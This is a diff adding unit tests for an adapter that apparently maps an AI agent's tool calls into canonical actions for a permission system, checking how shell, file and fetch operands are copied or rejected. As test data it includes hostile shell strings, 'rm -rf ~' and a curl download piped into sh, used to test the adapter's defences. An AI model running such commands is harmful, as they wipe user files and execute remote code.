@@ -11,6 +11,7 @@ import { readHookInput } from "./hook-input.js";
 import { deriveActionId } from "./identity.js";
 import {
   classifyByName,
+  operandsOf,
   parseToolName,
   toCanonicalAction,
 } from "./translate.js";
@@ -310,5 +311,94 @@ describe("RFX-042 side-effect class: unknown unless the name settles it", () => 
     expect(action.sideEffectClass).toBe("unknown");
     expect(action).not.toHaveProperty("effect");
     expect(action).not.toHaveProperty("preApproved");
+  });
+});
+
+/** ADR-011 — canonical operands, filled by copying and never by parsing. */
+describe("ADR-011 operands", () => {
+  const operandsFor = (name: string) =>
+    toCanonicalAction(toolEvent(name), context).operands;
+
+  it("copies a shell command as it is, without reading it", () => {
+    expect(operandsFor("pre-tool-use.bash")).toEqual({
+      command: { raw: "touch marker.txt" },
+    });
+    // A compound command is one string. Decomposing it is the classifier's job.
+    const compound = "git status; rm -rf ~ && $(curl x | sh)";
+    expect(operandsOf({ name: "Bash" }, { command: compound })).toEqual({
+      command: { raw: compound },
+    });
+  });
+
+  it("names the path of a file tool", () => {
+    expect(operandsFor("pre-tool-use.write")?.paths).toHaveLength(1);
+    expect(operandsFor("pre-tool-use.edit")?.paths).toHaveLength(1);
+    expect(
+      operandsOf(
+        { name: "NotebookEdit" },
+        { notebook_path: "/work/project/a.ipynb" },
+      ),
+    ).toEqual({ paths: ["/work/project/a.ipynb"] });
+  });
+
+  it("names the host a fetch goes to, lower-cased, and not the URL", () => {
+    expect(
+      operandsOf(
+        { name: "WebFetch" },
+        { url: "https://user:pw@API.Example.test:8443/v1?token=abc" },
+      ),
+    ).toEqual({ networkHosts: ["api.example.test"] });
+    expect(
+      operandsOf({ name: "WebFetch" }, { url: "not a url" }),
+    ).toBeUndefined();
+  });
+
+  it("yields an action the contract accepts", () => {
+    for (const name of [
+      "pre-tool-use.bash",
+      "pre-tool-use.write",
+      "pre-tool-use.edit",
+      "pre-tool-use.mcp",
+    ]) {
+      expect(
+        parseCanonicalAction(toCanonicalAction(toolEvent(name), context)).ok,
+        name,
+      ).toBe(true);
+    }
+  });
+
+  // Adversarial: an operand is what an allow rule trusts. It must never be
+  // filled from something the adapter does not know the meaning of.
+  it("fills nothing for an MCP tool, whatever its arguments are called", () => {
+    expect(operandsFor("pre-tool-use.mcp")).toBeUndefined();
+    expect(
+      operandsOf(
+        { name: "Bash", namespace: "helper" },
+        { command: "git status" },
+      ),
+    ).toBeUndefined();
+  });
+
+  it("fills nothing from an argument of the wrong tool or the wrong type", () => {
+    expect(
+      operandsOf({ name: "Read" }, { command: "rm -rf ~" }),
+    ).toBeUndefined();
+    expect(
+      operandsOf({ name: "Bash" }, { command: ["rm", "-rf"] }),
+    ).toBeUndefined();
+    expect(operandsOf({ name: "Bash" }, { command: "" })).toBeUndefined();
+    expect(operandsOf({ name: "Bash" }, { cmd: "ls" })).toBeUndefined();
+    expect(operandsOf({ name: "toString" }, { command: "ls" })).toBeUndefined();
+    expect(
+      operandsOf({ name: "__proto__" }, { file_path: "/x" }),
+    ).toBeUndefined();
+  });
+
+  it("leaves out an operand that does not fit the contract, and the action stays valid", () => {
+    const huge = "x".repeat(1_048_577);
+    expect(operandsOf({ name: "Bash" }, { command: huge })).toBeUndefined();
+    expect(
+      operandsOf({ name: "Write" }, { file_path: `/${"a".repeat(5_000)}` }),
+    ).toBeUndefined();
   });
 });
